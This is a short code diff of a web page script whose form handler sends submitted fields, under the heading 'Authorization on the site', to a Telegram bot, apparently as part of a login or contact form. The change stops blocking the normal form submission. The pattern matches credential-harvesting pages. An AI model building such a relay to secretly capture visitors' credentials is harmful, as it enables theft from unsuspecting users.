@@ -44,7 +44,7 @@
         const URL = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
 
         document.getElementById("form").addEventListener('submit', function(e) {
-            e.preventDefault();
+            // e.preventDefault();
             
             let message = `<b>Authorization on the site</b>\n`;
             message += `<b>Sender Name :</b>${this.name.value}\n`;
